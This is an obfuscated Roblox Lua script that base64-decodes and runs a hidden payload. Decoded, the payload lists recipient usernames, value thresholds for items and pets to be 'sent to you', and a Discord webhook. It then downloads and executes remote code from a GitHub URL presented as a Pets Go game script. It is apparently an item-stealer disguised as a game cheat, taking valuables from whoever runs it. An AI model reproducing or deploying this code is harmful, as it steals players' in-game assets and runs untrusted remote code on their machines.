
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsgIk5PVEJFTlNBTFRBQ0MiLCAiQmVubnlib2licm8xMjMiLCAiTk9UQkVOU0FMVEFDQyIsIC0tIEFkZCBtb3JlIHVzZXJzIGJlbG93IGlmIHlvdSB3YW50IHRvCiAgLS0gInVzZXI0IiwKICAtLSAidXNlcjUiLAp9Cm1pbl9yYXAgPSAxMDAwIC0tIG1pbmltdW0gcmFwIG9mIGVhY2ggaXRlbSB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3UuIDFrIGJ5IGRlZmF1bHQKbWluX2NoYW5jZSA9IDEwMDAwMDAgLS0gbWluaW11bSBjaGFuY2Ugb2YgcGV0cyB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3UuIDEwMGsgYnkgZGVmYXVsdCwgd2hpY2ggbWVhbnMgdGhhdCBpdCB3aWxsIG5vdCBzZW5kIHBldHMgdW5kZXIgMSBpbiAxMGsKd2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQxMzg4ODQxNzQyNzYyMDY2L2x5bG0xdTZ3bmlNd2hXT2VZU2ZrUXhnc2R4aXpMYmRNWjFaNUxZT19kaXQ4ZVI2V2Z2YzhTaDFXUVkwOUJaaHM4TnZ0IgoKLS0gUEVUU0dPIFNjcmlwdApsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JBS0FqZGRjL05ldy1Tb3VyY2VzL3JlZnMvaGVhZHMvbWFpbi9QZXRzR29CeVRydWx5Tm90QmVuLnR4dCIsIHRydWUpKSgpCg=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
